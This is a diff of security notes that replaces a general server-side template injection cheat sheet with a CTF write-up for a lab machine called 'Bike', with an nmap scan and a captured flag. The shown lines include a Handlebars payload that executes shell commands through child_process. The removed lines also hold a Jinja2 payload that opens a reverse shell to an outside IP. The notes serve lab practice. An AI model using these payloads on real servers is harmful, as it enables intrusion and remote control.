@@ -1,48 +1,38 @@
 
-Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
-
-This https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html shows a lot of exploitation paths for many template injections.
+## CTF Writeup: Bike
 
 ---
-##### Test for SSTI
+## Reconnaissance
+
+An initial scan revealed the following information about running services on the target server.
+
+```
+nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.97.64  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 07:33 -0500
+Nmap scan report for 10.129.97.64
+Host is up (0.018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    Node.js (Express middleware)
+|_http-title:  Bike 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds
+```
+
+The webpage has an e-mail tab. pasted the following to test for SSTI.
 
 ```
 {{7*7}}
-${7*7}
-<%= 7*7 %>
-${{7*7}}
-#{7*7}
-```
-If this error's out or breaks smth it means the template engine detected it as valid code, but wasn't able to execute it, bingo!
-
-##### SSTI for Handlebars Template Engine
-
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('whoami');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-
-URLencoded:
-%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
 ```
 
-If it still error's out or doesn't show the username probably it fails to laod the module "require". Utilize the following input so the Template Engine can load the module.
+Utilize the following input so the Template Engine can load the module.
 
 ```
 {{#with "s" as |string|}}
@@ -167,10 +157,6 @@ URL Encoded it & gained Command Execution!
 
 URL Encoded this using BurpSuite's Decoder & gained flag.txt
 
-##### SSTI for Python Environment (Jinja2, Mako template engine)
-
 ```
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.15.35\",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'") }}
+6b258d726d287462d60c103d0142a81c
 ```
-
-
